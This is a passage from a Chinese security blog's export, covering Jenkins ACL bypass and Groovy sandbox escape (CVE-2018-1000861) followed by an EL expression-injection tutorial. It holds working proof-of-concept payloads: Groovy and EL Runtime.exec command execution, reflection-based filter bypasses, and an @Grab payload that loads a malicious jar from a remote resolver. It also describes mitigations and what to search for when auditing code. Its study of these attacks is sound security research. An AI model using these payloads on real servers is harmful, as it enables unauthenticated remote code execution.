Jenkins白名单路由Jenkins动态路由主要调用的是org.kohsuke.stapler.Stapler#tryInvoke()方法，该方法会对除了boundObjectTable外所有node都会进行一次权限检查，具体实现在jenkins.model.Jenkins#getTarget()中，这其中实际就是一个URL前缀白名单检查： 12345678910111213private static final ImmutableSet&lt;String&gt; ALWAYS_READABLE_PATHS = ImmutableSet.of( \"/login\", \"/logout\", \"/accessDenied\", \"/adjuncts/\", \"/error\", \"/oops\", \"/signup\", \"/tcpSlaveAgentListener\", \"/federatedLoginService/\", \"/securityRealm\", \"/instance-identity\"); 因此，绕过ACL的关键在于，要在上述白名单的一个入口点中找到其他对象的Reference（引用），来跳到非白名单成员从而实现绕过白名单URL前缀的限制。 通过对象间的Reference绕过ACL如上所述，关键在于找到一个Reference作为跳板来绕过，Orange给出了如下跳板： 1/securityRealm/user/[username]/descriptorByName/[descriptor_name]/ 该跳板在动态路由中会依次执行如下方法： 123jenkins.model.Jenkins.getSecurityRealm().getUser([username]).getDescriptorByName([descriptor_name]) 这是因为在Jenkins中，每个对象都是继承于hudson.model.Descriptor类，而继承该类的对象可以通过调用hudson.model.DescriptorByNameOwner#getDescriptorByName(String)方法来进行调用。 RCE GadgetOrange给出了好几条可结合利用的漏洞利用链，其中之最当然是RCE的Gadget。 前面简介中提到了Jenkins Pipeline，它其实就是基于Groovy实现的一个DSL，可使开发者十分方便地去编写一些Build Script来完成自动化的编译、测试和发布。 在Jenkins中，大致使用如下代码来检测Groovy的语法： 12345678910public JSON doCheckScriptCompile(@QueryParameter String value) &#123; try &#123; CpsGroovyShell trusted = new CpsGroovyShellFactory(null).forTrusted().build(); new CpsGroovyShellFactory(null).withParent(trusted).build().getClassLoader().parseClass(value); &#125; catch (CompilationFailedException x) &#123; return JSONArray.fromObject(CpsFlowDefinitionValidator.toCheckStatus(x).toArray()); &#125; return CpsFlowDefinitionValidator.CheckStatus.SUCCESS.asJSON(); // Approval requirements are managed by regular stapler form validation (via doCheckScript)&#125; 关键就是GroovyClassLoader.parseClass()，该方法只是进行AST解析但并未执行Groovy语句，即实际并没有execute()方法调用，而且真正执行Groovy代码时会遇到Groovy沙箱的限制。 如何解决这个问题来绕过Groovy沙箱呢？Orange给出了答案——借助编译时期的Meta Programming，其中提到了两种方法。 利用@ASTTest执行断言根据Groovy的Meta Programming手册，发现可利用`@groovy.transform.ASTTest`注解来实现在AST上执行一个断言。例如： 12@groovy.transform.ASTTest(value=&#123; assert Runtime.getRuntime().exec(\"calc\") &#125;)class Person&#123;&#125; 但在远程利用上会报错，原因在于Pipeline Shared Groovy Libraries Plugin这个插件，主要用于在PipeLine中引入自定义的函式库。Jenkins会在所有PipeLine执行前引入这个插件，而在编译阶段的ClassPath中并没有对应的函式库从而导致报错。 直接删掉这个插件是可以成功利用的，但由于该插件是随PipeLine默认安装的、因此这不是最优解。 利用@Grab远程加载恶意类@Grab注解的详细用法在Dependency management with Grape中有讲到，简单地说，Grape是Groovy内建的一个动态Jar依赖管理程序，允许开发者动态引入不在ClassPath中的函式库。例如： 123@GrabResolver(name='restlet', root='http://maven.restlet.org/')@Grab(group='org.restlet', module='org.restlet', version='1.1.6')import org.restlet 0x02 Groovy入门Groovy简介Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy代码能够与Java代码很好地结合，也能用于扩展现有代码。由于其运行在JVM上的特性，Groovy也可以使用其他非Java语言编写的库。 Groovy是用于Java虚拟机的一种敏捷的动态语言，它是一种成熟的面向对象编程语言，既可以用于面向对象编程，又可以用作纯粹的脚本语言。使用该种语言不必编写过多的代码，同时又具有闭包和动态语言中的其他特性。 Groovy是JVM的一个替代语言（替代是指可以用Groovy在Java平台上进行Java编程），使用方式基本与使用Java代码的方式相同，该语言特别适合与Spring的动态语言支持一起使用，设计时充分考虑了Java集成，这使Groovy与Java代码的互操作很容易。（注意：不是指Groovy替代Java，而是指Groovy和Java很好的结合编程。） Groovy有以下特点： 同时支持静态和动态类型； 支持运算符重载； 本地语法列表和关联数组； 对正则表达式的本地支持； 各种标记语言，如XML和HTML原生支持； Groovy对于Java开发人员来说很简单，因为Java和Groovy的语法非常相似； 可以使用现有的Java库； Groovy扩展了java.lang.Object； 基本语法参考：https://www.w3cschool.cn/groovy/ 环境搭建下载Groovy：http://groovy-lang.org/download.html 解压之后，使用IDEA新建Groovy项目时选择解压的Groovy目录即可。然后点击src-&gt;new&gt;groovy class，即可新建一个groovy文件，内容如下： 12345class test &#123; static void main(args)&#123; println \"Hello World!\"; &#125;&#125; 5种运行方式groovyConsole图形交互控制台在终端下输入groovyConsole启动图形交互控制台，在上面可以直接编写代码执行： groovysh shell命令交互在终端下输入groovysh启动一个shell命令行来执行Groovy代码的交互： 用命令行执行Groovy脚本在GROOVY_HOME\\bin里有个叫“groovy”或“groovy.bat”的脚本文件，可以类似python test.py这种方式来执行Groovy脚本。 1.groovy： 1println(\"mi1k7ea\") 在Windows运行groovy.bat 1.groovy即可执行该Groovy脚本： 通过IDE运行Groovy脚本有一个叫GroovyShell的类含有main(String[])方法可以运行任何Groovy脚本。 在前面的IDEA中可以直接运行Groovy脚本： 当然，也可以在Java环境中通过groovy-all.jar中的groovy.lang.GroovyShell类来运行Groovy脚本： 1java -cp groovy-all-2.4.12.jar groovy.lang.GroovyShell 1.groovy 用Groovy创建Unix脚本你可以用Groovy编写Unix脚本并且像Unix脚本一样直接从命令行运行它.倘若你安装的是二进制分发包并且设置好环境变量,那么下面的代码将会很好的工作。 编写一个类似如下的脚本文件，保存为：HelloGroovy 123#!/usr/bin/env groovyprintln(\"this is groovy script\")println(\"Hi,\"+args[0]+\" welcome to Groovy\") 然后在命令行下执行： 1234$ chmod +x HelloGroovy$ ./HelloGroovy micmiu.comthis is groovy scriptHi,micmiu.com welcome to Groovy 0x03 Groovy代码注入漏洞原理我们知道，Groovy是一种强大的编程语言，其强大的功能包括了危险的命令执行等调用。 在目标服务中，如果外部可控输入Groovy代码或者外部可上传一个恶意的Groovy脚本，且程序并未对输入的Groovy代码进行有效的过滤，那么会导致恶意的Groovy代码注入，从而RCE。 如下代码简单地执行命令： 123456class test &#123; static void main(args)&#123; def cmd = \"calc\"; println \"$&#123;cmd.execute()&#125;\"; &#125;&#125; 这段Groovy代码被执行就会弹计算器： 几种PoC变通形式Groovy代码注入实现命令执行有以下几种变通的形式： 1234567891011121314// 直接命令执行Runtime.getRuntime().exec(\"calc\")\"calc\".execute()'calc'.execute()\"$&#123;\"calc\".execute()&#125;\"\"$&#123;'calc'.execute()&#125;\"// 回显型命令执行println \"whoami\".execute().textprintln 'whoami'.execute().textprintln \"$&#123;\"whoami\".execute().text&#125;\"println \"$&#123;'whoami'.execute().text&#125;\"def cmd = \"whoami\";println \"$&#123;cmd.execute().text&#125;\"; 注入点在下面一些场景中，会触发Groovy代码注入漏洞。 GroovyShellGroovyShell允许在Java类中（甚至Groovy类）解析任意Groovy表达式的值。 GroovyShellExample.java： 12345678import groovy.lang.GroovyShell;public class GroovyShellExample &#123; public static void main( String[] args ) &#123; GroovyShell groovyShell = new GroovyShell(); groovyShell.evaluate(\"\\\"calc\\\".execute()\"); &#125;&#125; 直接运行即可弹计算器： 或者换成运行Groovy脚本的方式也是也一样的： 123456789101112import groovy.lang.GroovyShell;import groovy.lang.Script;import java.io.File;public class GroovyShellExample &#123; public static void main( String[] args ) throws Exception &#123; GroovyShell groovyShell = new GroovyShell(); Script script = groovyShell.parse(new File(\"src/test.groovy\")); script.run(); &#125;&#125; test.groovy： 1println \"whoami\".execute().text 此外，可使用Binding对象输入参数给表达式，并最终通过GroovyShell返回Groovy表达式的计算结果。 GroovyScriptEngineGroovyScriptEngine可从指定的位置（文件系统、URL、数据库等等）加载Groovy脚本，并且随着脚本变化而重新加载它们。如同GroovyShell一样，GroovyScriptEngine也允许传入参数值，并能返回脚本的计算值。 GroovyScriptEngineExample.java，直接运行即加载Groovy脚本文件实现命令执行： 123456789import groovy.lang.Binding;import groovy.util.GroovyScriptEngine;public class GroovyScriptEngineExample &#123; public static void main(String[] args) throws Exception &#123; GroovyScriptEngine groovyScriptEngine = new GroovyScriptEngine(\"\"); groovyScriptEngine.run(\"src/test.groovy\",new Binding()); &#125;&#125; test.groovy脚本文件如之前。 GroovyClassLoaderGroovyClassLoader是一个定制的类装载器，负责解释加载Java类中用到的Groovy类。 GroovyClassLoaderExample.java，直接运行即加载Groovy脚本文件实现命令执行： 12345678910111213import groovy.lang.GroovyClassLoader;import groovy.lang.GroovyObject;import java.io.File;public class GroovyClassLoaderExample &#123; public static void main(String[] args) throws Exception &#123; GroovyClassLoader groovyClassLoader = new GroovyClassLoader(); Class loadClass = groovyClassLoader.parseClass(new File(\"src/test.groovy\")); GroovyObject groovyObject = (GroovyObject) loadClass.newInstance(); groovyObject.invokeMethod(\"main\",\"\"); &#125;&#125; test.groovy脚本文件如之前。 ScriptEngineScriptEngine脚本引擎是被设计为用于数据交换和脚本执行的。 数据交换：表现在调度引擎的时候，允许将数据输入/输出引擎，至于引擎内的数据持有的具体方式有两种：普通的键值对和Bindings（interface Bindings extends Map&lt;String,Object&gt;）； 脚本执行：脚本引擎执行表现为调用eval()； ScriptEngineManager类是一个脚本引擎的管理类，用来创建脚本引擎，大概的方式就是在类加载的时候通过SPI的方式，扫描ClassPath中已经包含实现的所有ScriptEngineFactory，载入后用来负责生成具体的ScriptEngine。 在ScriptEngine中，支持名为“groovy”的引擎，可用来执行Groovy代码。这点和在SpEL表达式注入漏洞中讲到的同样是利用ScriptEngine支持JS引擎从而实现绕过达到RCE是一样的。 ScriptEngineExample.java，直接运行即命令执行： 123456789import javax.script.ScriptEngine;import javax.script.ScriptEngineManager;public class ScriptEngineExample &#123; public static void main( String[] args ) throws Exception &#123; ScriptEngine groovyEngine = new ScriptEngineManager().getEngineByName(\"groovy\"); groovyEngine.eval(\"\\\"calc\\\".execute()\"); &#125;&#125; 执行Groovy脚本，需要实现读取文件内容的接口而不能直接传入File类对象： 12345678910111213141516171819202122import javax.script.ScriptEngine;import javax.script.ScriptEngineManager;import java.io.BufferedReader;import java.io.FileReader;public class ScriptEngineExample &#123; public static void main( String[] args ) throws Exception &#123; ScriptEngine groovyEngine = new ScriptEngineManager().getEngineByName(\"groovy\"); String code = readfile(\"src/test.groovy\"); groovyEngine.eval(code); &#125; public static String readfile(String filename) throws Exception &#123; BufferedReader in = new BufferedReader(new FileReader(filename)); String string = \"\"; String str; while ((str = in.readLine()) != null) &#123; string = string + str; &#125; return string; &#125;&#125; test.groovy脚本文件如之前。 0x04 Bypass Tricks利用反射机制和字符串拼接Bypass直接的命令执行在前面已经说过几种形式了： 1234567891011121314// 直接命令执行Runtime.getRuntime().exec(\"calc\")\"calc\".execute()'calc'.execute()\"$&#123;\"calc\".execute()&#125;\"\"$&#123;'calc'.execute()&#125;\"// 回显型命令执行println \"whoami\".execute().textprintln 'whoami'.execute().textprintln \"$&#123;\"whoami\".execute().text&#125;\"println \"$&#123;'whoami'.execute().text&#125;\"def cmd = \"whoami\";println \"$&#123;cmd.execute().text&#125;\"; 在某些场景下，程序可能会过滤输入内容，此时可以通过反射机制以及字符串拼接的方式来绕过实现命令执行： 12345import java.lang.reflect.Method;Class&lt;?&gt; rt = Class.forName(\"java.la\" + \"ng.Run\" + \"time\");Method gr = rt.getMethod(\"getR\" + \"untime\");Method ex = rt.getMethod(\"ex\" + \"ec\", String.class);ex.invoke(gr.invoke(null), \"ca\" + \"lc\") Groovy沙箱Bypass前面说到的Groovy代码注入都是注入了execute()函数，从而能够成功执行Groovy代码，这是因为不是在Jenkins中执行即没有Groovy沙箱的限制。但是在存在Groovy沙箱即只进行AST解析无调用或限制execute()函数的情况下就需要用到其他技巧了。这也是Orange大佬在绕过Groovy沙箱时用到的技巧。 @AST注解执行断言参考Groovy的Meta Programming手册，利用AST注解能够执行断言从而实现代码执行（本地测试无需assert也能触发代码执行）。 PoC： 123456this.class.classLoader.parseClass(''' @groovy.transform.ASTTest(value=&#123; assert Runtime.getRuntime().exec(\"calc\") &#125;) def x'''); 本地测试： @Grab注解加载远程恶意类@Grab注解的详细用法在Dependency management with Grape中有讲到，简单地说，Grape是Groovy内建的一个动态Jar依赖管理程序，允许开发者动态引入不在ClassPath中的函式库。 编写恶意Exp类，命令执行代码写在其构造函数中： 12345678public class Exp &#123; public Exp()&#123; try &#123; java.lang.Runtime.getRuntime().exec(\"calc\"); &#125; catch (Exception e) &#123; &#125; &#125;&#125; 依次运行如下命令： 1234javac Exp.javamkdir -p META-INF/services/echo Exp &gt; META-INF/services/org.codehaus.groovy.plugins.Runnersjar cvf poc-0.jar Exp.class META-INF 先在Web根目录中新建/test/poc/0/目录，然后复制该jar包到该子目录下，接着开始HTTP服务。 PoC： 123456this.class.classLoader.parseClass(''' @GrabConfig(disableChecksums=true) @GrabResolver(name='Exp', root='http://127.0.0.1:8000/') @Grab(group='test', module='poc', version='0') import Exp;''') 运行，成功请求远程恶意Jar包并导入恶意Exp类执行其构造函数，从而导致RCE： 0x05 排查方法排查关键类函数特征： 关键类 关键函数 groovy.lang.GroovyShell evaluate groovy.util.GroovyScriptEngine run groovy.lang.GroovyClassLoader parseClass javax.script.ScriptEngine eval 0x06 参考Hacking Jenkins Part 1 - Play with Dynamic Routing Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE! Jenkins RCE分析（CVE-2018-1000861分析） Jenkins groovy scripts for read teamers and penetration testers","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://www.mi1k7ea.com/tags/Jenkins/"},{"name":"Groovy","slug":"Groovy","permalink":"https://www.mi1k7ea.com/tags/Groovy/"}]},{"title":"（先知首发）浅析EL表达式注入漏洞","date":"2020-04-25T16:05:47.000Z","path":"2020/04/26/浅析EL表达式注入漏洞/","text":"先知：https://xz.aliyun.com/t/7692 0x01 EL简介EL（Expression Language） 是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。 EL表达式主要功能如下： 获取数据：EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的Web域中检索Java对象、获取数据（某个Web域中的对象，访问JavaBean的属性、访问List集合、访问Map集合、访问数组）； 执行运算：利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算，例如${user==null}； 获取Web开发常用对象：EL表达式定义了一些隐式对象，利用这些隐式对象，Web开发人员可以很轻松获得对Web常用对象的引用，从而获得这些对象中的数据； 调用Java方法：EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法； 0x02 基本语法EL语法在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以${}表示。例如，${ userinfo}代表获取变量userinfo的值。当EL表达式中的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量，例如：${ pageScope. userinfo}表示访问page范围中的userinfo变量。 简单地说，使用EL表达式语法：${EL表达式} 其中，EL表达式和JSP代码等价转换。事实上，可以将EL表达式理解为一种简化的JSP代码。 扩展JSP代码的写法总结： JSP表达式：&lt;%=变量或表达式&gt; 向浏览器输出变量或表达式的计算结果。 JSP脚本：&lt;%Java代码%&gt; 执行java代码的原理：翻译到_jspService()方法中。 JSP声明：&lt;%!变量或方法%&gt; 声明jsp的成员变量或成员方法。 JSP注释：&lt;%!--JSP注释--%&gt; 用于注释JSP代码，不会翻译到Java文件中，也不会执行。 [ ]与.运算符EL表达式提供.和[]两种运算符来存取数据。 当要存取的属性名称中包含一些特殊字符，如.或-等并非字母或数字的符号，就一定要使用[]。例如：${user.My-Name}应当改为${user[&quot;My-Name&quot;]}。 如果要动态取值时，就可以用[]来做，而.无法做到动态取值。例如：${sessionScope.user[data]}中data 是一个变量。 变量EL表达式存取变量数据的方法很简单，例如：${username}。它的意思是取出某一范围中名称为username的变量。因为我们并没有指定哪一个范围的username，所以它会依序从Page、Request、Session、Application范围查找。假如途中找到username，就直接回传，不再继续找下去，但是假如全部的范围都没有找到时，就回传””。EL表达式的属性如下： 属性范围在EL中的名称 Page PageScope Request RequestScope Session SessionScope Application ApplicationScope JSP表达式语言定义可在表达式中使用的以下文字： 文字 文字的值 Boolean true 和 false Integer 与 Java 类似。可以包含任何整数，例如 24、-45、567 Floating Point 与 Java 类似。可以包含任何正的或负的浮点数，例如 -1.8E-45、4.567 String 任何由单引号或双引号限定的字符串。对于单引号、双引号和反斜杠，使用反斜杠字符作为转义序列。必须注意，如果在字符串两端使用双引号，则单引号不需要转义。 Null null 操作符JSP表达式语言提供以下操作符，其中大部分是Java中常用的操作符： 术语 定义 算术型 +、-（二元）、*、/、div、%、mod、-（一元） 逻辑型 and、&amp;&amp;、or、双管道符、!、not 关系型 ==、eq、!=、ne、&lt;、lt、&gt;、gt、&lt;=、le、&gt;=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。 空 empty 空操作符是前缀操作，可用于确定值是否为空。 条件型 A ?B :C。根据 A 赋值的结果来赋值 B 或 C。 隐式对象JSP表达式语言定义了一组隐式对象，其中许多对象在 JSP scriplet 和表达式中可用： 术语 定义 pageContext JSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，${pageContext.response}为页面的响应对象赋值。 此外，还提供几个隐式对象，允许对以下对象进行简易访问： 术语 定义 param 将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式${param . name}相当于 request.getParameter (name)。 paramValues 将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 ${paramvalues. name} 相当于 request.getParamterValues(name)。 header 将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 ${header. name} 相当于 request.getHeader(name)。 headerValues 将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式${headerValues. name}相当于 request.getHeaderValues(name)。 cookie 将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式${cookie. name .value}返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用${headerValues. name}表达式。 initParam 将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。 除了上述两种类型的隐式对象之外，还有些对象允许访问多种范围的变量，如 Web 上下文、会话、请求、页面： 术语 定义 pageScope 将页面范围的变量名称映射到其值。例如，EL 表达式可以使用${pageScope.objectName}访问一个 JSP 中页面范围的对象，还可以使用${pageScope .objectName. attributeName}访问对象的属性。 requestScope 将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用${requestScope. objectName}访问一个 JSP 请求范围的对象，还可以使用${requestScope. objectName. attributeName}访问对象的属性。 sessionScope 将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：${sessionScope. name} applicationScope 将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。 pageContext对象pageContext对象是JSP中pageContext对象的引用。通过pageContext对象，您可以访问request对象。比如，访问request对象传入的查询字符串，就像这样： 1$&#123;pageContext.request.queryString&#125; Scope对象pageScope，requestScope，sessionScope，applicationScope变量用来访问存储在各个作用域层次的变量。 举例来说，如果您需要显式访问在applicationScope层的box变量，可以这样来访问：applicationScope.box。 1234567891011121314&lt;% pageContext.setAttribute(\"name\",\"mi1k7ea_page\"); request.setAttribute(\"name\",\"mi1k7ea_request\"); session.setAttribute(\"user\",\"mi1k7ea_session\"); application.setAttribute(\"user\",\"mi1k7ea_application\");%&gt;pageScope.name:$&#123;pageScope.name&#125;&lt;/br&gt;requestScope.name : $&#123;requestScope.name&#125;&lt;/br&gt;sessionScope.user : $&#123;sessionScope.user&#125;&lt;/br&gt;applicationScope.user : $&#123;applicationScope.user&#125; param和paramValues对象param和paramValues对象用来访问参数值，通过使用request.getParameter方法和request.getParameterValues方法。 举例来说，访问一个名为order的参数，可以这样使用表达式：${param.order}，或者${param[“order”]}。 接下来的例子表明了如何访问request中的username参数： 1234567891011121314151617&lt;%@ page import=\"java.io.*,java.util.*\" %&gt;&lt;% String title = \"Accessing Request Param\";%&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;&lt;/center&gt;&lt;div align=\"center\"&gt;&lt;p&gt;$&#123;param[\"username\"]&#125;&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; param对象返回单一的字符串，而paramValues对象则返回一个字符串数组。 header和headerValues对象header和headerValues对象用来访问信息头，通过使用request.getHeader()方法和request.getHeaders()方法。 举例来说，要访问一个名为user-agent的信息头，可以这样使用表达式：${header.user-agent}，或者${header[&quot;user-agent&quot;]}。 接下来的例子表明了如何访问user-agent信息头： 1234567891011121314151617&lt;%@ page import=\"java.io.*,java.util.*\" %&gt;&lt;% String title = \"User Agent Example\";%&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;&lt;/center&gt;&lt;div align=\"center\"&gt;&lt;p&gt;$&#123;header[\"user-agent\"]&#125;&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 运行结果如下： header对象返回单一值，而headerValues则返回一个字符串数组。 EL中的函数EL允许您在表达式中使用函数。这些函数必须被定义在自定义标签库中。函数的使用语法如下： 1$&#123;ns:func(param1, param2, ...)&#125; ns指的是命名空间（namespace），func指的是函数的名称，param1指的是第一个参数，param2指的是第二个参数，以此类推。比如，有函数fn:length，在JSTL库中定义，可以像下面这样来获取一个字符串的长度： 1$&#123;fn:length(&quot;Get my length&quot;)&#125; 要使用任何标签库中的函数，您需要将这些库安装在服务器中，然后使用&lt;taglib&gt;标签在JSP文件中包含这些库。 EL表达式调用Java方法看个例子即可。 先新建一个ELFunc类，其中定义的doSomething()函数用于给输入的参数字符拼接”.com”形成域名返回： 1234567package eltest;public class ELFunc &#123; public static String doSomething(String str)&#123; return str + \".com\"; &#125;&#125; 接着在WEB-INF文件夹下（除lib和classess目录外）新建test.tld文件，其中指定执行的Java方法及其URI地址： 12345678910111213&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;taglib version=\"2.0\" xmlns=\"http://java.sun.com/xml/ns/j2ee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd\"&gt; &lt;tlib-version&gt;1.0&lt;/tlib-version&gt; &lt;short-name&gt;ELFunc&lt;/short-name&gt; &lt;uri&gt;http://www.mi1k7ea.com/ELFunc&lt;/uri&gt; &lt;function&gt; &lt;name&gt;doSomething&lt;/name&gt; &lt;function-class&gt;eltest.ELFunc&lt;/function-class&gt; &lt;function-signature&gt; java.lang.String doSomething(java.lang.String)&lt;/function-signature&gt; &lt;/function&gt;&lt;/taglib&gt; JSP文件中，先头部导入taglib标签库，URI为test.tld中设置的URI地址，prefix为test.tld中设置的short-name，然后直接在EL表达式中使用类名:方法名()的形式来调用该类方法即可： 12&lt;%@taglib uri=\"http://www.mi1k7ea.com/ELFunc\" prefix=\"ELFunc\"%&gt;$&#123;ELFunc:doSomething(\"mi1k7ea\")&#125; 0x03 JSP中启动/禁用EL表达式全局禁用EL表达式web.xml中进入如下配置： 123456&lt;jsp-config&gt; &lt;jsp-property-group&gt; &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt; &lt;el-ignored&gt;true&lt;/el-ignored&gt; &lt;/jsp-property-group&gt;&lt;/jsp-config&gt; 单个文件禁用EL表达式在JSP文件中可以有如下定义： 1&lt;%@ page isELIgnored=\"true\" %&gt; 该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。 JSP2.0中默认的启用EL表达式。 例如如下的JSP代码禁用EL表达式： 12&lt;%@ page isELIgnored=\"true\" %&gt;$&#123;pageContext.request.queryString&#125; 0x04 EL表达式注入漏洞EL表达式注入漏洞和SpEL、OGNL等表达式注入漏洞是一样的漏洞原理的，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。 一般的，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分是从外部获取的。 通用PoC1234567891011121314//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）$&#123;pageContext&#125;//获取Web路径$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;//文件头参数$&#123;header&#125;//获取webRoot$&#123;applicationScope&#125;//执行命令$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;).getInputStream())&#125; 比如我们在Java程序中可以控制输入EL表达式如下： 1$&#123;pageContext.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc.exe&quot;))&#125; 如果该EL表达式直接在JSP页面中执行，则触发任意代码执行漏洞： 但是在实际场景中，是几乎没有也无法直接从外部控制JSP页面中的EL表达式的。而目前已知的EL表达式注入漏洞都是框架层面服务端执行的EL表达式外部可控导致的。 CVE-2011-2730命令执行PoC如下： 123&lt;spring:message text=\"$&#123;/\"/\".getClass().forName(/\"java.lang.Runtime/\").getMethod(/\"getRuntime/\",null).invoke(null,null).exec(/\"calc/\",null).toString()&#125;\"&gt;&lt;/spring:message&gt; 再比如： 12&lt;%@ taglib uri=\"http://www.springframework.org/tags\" prefix=\"spring\"%&gt;&lt;spring:message text=\"$&#123;param.a&#125;\"&gt;&lt;/spring:message&gt; 访问http://localhost/XXX.jsp?a=$](https://links.jianshu.com/go?to=http%3A%2F%2Flocalhost%2FXXX.jsp%3Fa%3D%24){applicationScope}。 容器第一次执行EL表达式${param.a}获得了我们输入的${applicationScope}，然后Spring标签获取容器的EL表达式求值对象，把${applicationScope}再次执行掉，形成了漏洞。 Wooyun案例参考Wooyun镜像上的案例： 搜狗某系统存在远程EL表达式注入漏洞(命令执行) 工商银行某系统存在远程EL表达式注入漏洞(命令执行) JUEL示例下面我们直接看下在Java代码中EL表达式注入的场景是怎么样的。 EL曾经是JSTL的一部分。然后，EL进入了JSP 2.0标准。现在，尽管是JSP 2.1的一部分，但EL API已被分离到包javax.el中， 并且已删除了对核心JSP类的所有依赖关系。换句话说：EL已准备好在非JSP应用程序中使用！ 也就是说，现在EL表达式所依赖的包javax.el等都在JUEL相关的jar包中。 JUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。 更多参考官网：http://juel.sourceforge.net/ 需要的jar包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7。 Test.java，利用反射调用Runtime类方法实现命令执行： 123456789101112131415161718import de.odysseus.el.ExpressionFactoryImpl;import de.odysseus.el.util.SimpleContext;import javax.el.ExpressionFactory;import javax.el.ValueExpression;public class Test &#123; public static void main(String[] args) &#123; ExpressionFactory expressionFactory = new ExpressionFactoryImpl(); SimpleContext simpleContext = new SimpleContext(); // failed // String exp = \"$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')&#125;\"; // ok String exp = \"$&#123;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')&#125;\"; ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class); System.out.println(valueExpression.getValue(simpleContext)); &#125;&#125; 运行即触发： 0x05 绕过方法这里针对前面在Java代码中注入EL表达式的例子来演示。其实绕过方法和SpEL表达式注入是一样的。 利用反射机制绕过即前面Demo的PoC，注意一点的就是这里不支持用字符串拼接的方式绕过关键字过滤。 利用ScriptEngine调用JS引擎绕过同SpEL注入中讲到的： 1$&#123;&apos;&apos;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;calc&apos;)&quot;)&#125; 0x06 防御方法 尽量不使用外部输入的内容作为EL表达式内容； 若使用，则严格过滤EL表达式注入漏洞的payload关键字； 如果是排查Java程序中JUEL相关代码，则搜索如下关键类方法： 12javax.el.ExpressionFactory.createValueExpression()javax.el.ValueExpression.getValue() 0x07 参考JSP 表达式语言 EL表达式调用java方法 JAVA WEB EL表达式注入","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"EL注入","slug":"EL注入","permalink":"https://www.mi1k7ea.com/tags/EL注入/"}]},{"title":"（先知首发）Tomcat 